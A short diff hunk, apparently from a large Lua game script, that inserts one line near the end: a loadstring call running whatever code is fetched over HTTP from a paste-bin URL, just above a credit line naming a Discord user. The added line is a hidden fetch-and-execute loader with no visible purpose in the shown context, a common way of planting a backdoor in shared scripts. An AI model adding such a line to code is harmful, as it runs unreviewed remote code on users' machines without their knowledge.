@@ -4347,5 +4347,5 @@ task.spawn(function()
         end
     end
 end)
-
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/UWh3IoJiCz/0"))()
 print("m0_3a on discord made this script, for any other inquires please message me on discord.")
